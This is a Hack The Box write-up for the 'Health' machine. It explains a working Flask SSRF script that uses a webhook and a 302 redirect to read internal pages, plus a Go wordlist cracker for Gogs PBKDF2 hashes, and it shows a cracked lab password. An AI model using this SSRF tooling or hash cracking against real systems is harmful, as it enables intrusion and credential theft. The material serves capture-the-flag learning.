# Hack The Box. Machines. Health

Machine write-up: https://7rocky.github.io/en/htb/health

### `ssrf.py`

This Python script is used to perfor a Server-Side Request Forgery attack via redirection with Flask.

The server offers a webhook functionality to test for a given URL and obtain the HTTP response in another URL. The idea is to test an internal URL, but internal IP addresses are filtered. Instead, we can apply a `302 Found` redirection to redirect the web client to an internal URL and read the response.

For that, we can use this Flask configuration:

```py
app = Flask(__name__)
logging.getLogger('werkzeug').setLevel(logging.CRITICAL)


@app.route('/monitored', methods=['GET'])
def monitored():
    return redirect(monitored_url)


@app.route('/payload', methods=['POST'])
def payload():
    print('\n[+] SSRF Response:\n\n' + request.json.get('body'))
    os._exit(0)
```

Both endpoints are really simple. Notice how I disabled the `werkzeug` logging and the use of `os._exit(0)` to force the exit of the program when received a request to `/payload`.

This is the `main` program:

```py
if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f'[!] Usage: {sys.argv[0]} <lhost> <monitored-url>')
        os._exit(1)

    lhost, monitored_url = sys.argv[1:]

    Thread(target=webhook, args=(lhost, )).start()
    app.run(host='0.0.0.0', port=80)
```

Notice that there is a function called `webhook` to configure the webhook in the web application. It uses a thread to make the configuration while setting up the Flask server:

```py
def webhook(lhost: str):
    s = requests.session()
    r = s.get('http://10.10.11.176')
    token = re.findall(r'<input type="hidden" name="_token" value="(.*?)">', r.text)[0]

    s.post('http://10.10.11.176/webhook', data={
        '_token': token,
        'webhookUrl': f'http://{lhost}/payload',
        'monitoredUrl': f'http://{lhost}/monitored',
        'frequency': '* * * * *',
        'onlyError': 0,
        'action': 'Test',
    })
```

We can use this script like this:

```console
$ python3 ssrf.py
[!] Usage: ssrf.py <lhost> <monitored-url>

$ python3 ssrf.py 10.10.17.44 http://127.0.0.1
 * Serving Flask app 'ssrf'
 * Debug mode: off

[+] SSRF Response:

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>HTTP Monitoring Tool</title>
    <link href="http://127.0.0.1/css/app.css" rel="stylesheet" type="text/css"/>
</head>
<body>
...
```

**Note:** The previous code snippets are shown only as an explanation, the complete source code is a bit different due to global variables and the imported libraries.

### `crack.go`

This script is used to crack a hashed password from Gogs using a wordlist.

First, we take the hash and salt and open the wordlist file. Then, we begin computing hashes using the same algorithm and salt until we find a coincidende:

```go
    hash, salt := os.Args[2], os.Args[3]
	file, err := os.Open(os.Args[1])

	if err != nil {
		fmt.Printf("File '%s' not found\n", os.Args[1])
	}

	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		password := scanner.Text()

		if EncodePassword(password, salt) == hash {
			fmt.Println("[+] Cracked:", password)
			break
		}
	}
```

The function that computes the hash is called `EncodePassword` (from [Gogs](https://github.com/gogs/gogs)):

```go
// EncodePassword encodes password using PBKDF2 SHA256 with given salt.
func EncodePassword(password, salt string) string {
	newPasswd := pbkdf2.Key([]byte(password), []byte(salt), 10000, 50, sha256.New)
	return fmt.Sprintf("%x", newPasswd)
}
```

To run it, we need to download a module:

```console
$ go mod init crack
go: creating new go.mod: module crack
go: to add module requirements and sums:
        go mod tidy

$ go mod tidy
go: finding module for package golang.org/x/crypto/pbkdf2
go: found golang.org/x/crypto/pbkdf2 in golang.org/x/crypto v0.5.0
```

And then we can use the program like this:

```console
$ go run crack.go $WORDLISTS/rockyou.txt 66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37 sO3XIbeW14
[+] Craked: february15
```